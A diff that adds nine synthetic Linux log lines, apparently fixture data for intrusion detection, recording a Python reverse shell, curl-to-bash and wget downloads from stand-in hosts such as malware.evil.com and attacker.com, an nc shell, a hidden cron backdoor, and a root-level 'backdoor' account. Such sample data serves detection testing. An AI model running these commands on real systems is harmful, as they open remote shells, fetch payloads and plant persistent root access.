@@ -1,0 +1,9 @@
+Apr 28 17:45:20 linux-server01 sudo: attacker : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.99",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call(["/bin/sh","-i"])
+Apr 28 17:45:21 linux-server01 auditd[1234]: EXECVE argc=3 a0="/bin/bash" a1="-c" a2="curl http://malware.evil.com/payload.sh | bash"
+Apr 28 17:45:22 linux-server01 auditd[1235]: EXECVE argc=2 a0="/usr/bin/nc" a1="-e /bin/sh 10.0.0.99 4444"
+Apr 28 17:45:23 linux-server01 auditd[1236]: EXECVE argc=4 a0="/usr/bin/wget" a1="-q" a2="-O" a3="/tmp/mimikatz.exe http://attacker.com/mimikatz.exe"
+Apr 28 17:45:24 linux-server01 cron[5678]: (root) CMD (/tmp/.hidden/backdoor.sh)
+Apr 28 17:45:25 linux-server01 systemd[1]: Started Suspicious Service - Reverse Shell Handler.
+Apr 28 17:45:26 linux-server01 useradd[9999]: new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash
+Apr 28 17:45:27 linux-server01 usermod[9998]: add 'backdoor' to group 'sudo'
+Apr 28 17:45:28 linux-server01 passwd[9997]: password changed for backdoor by root
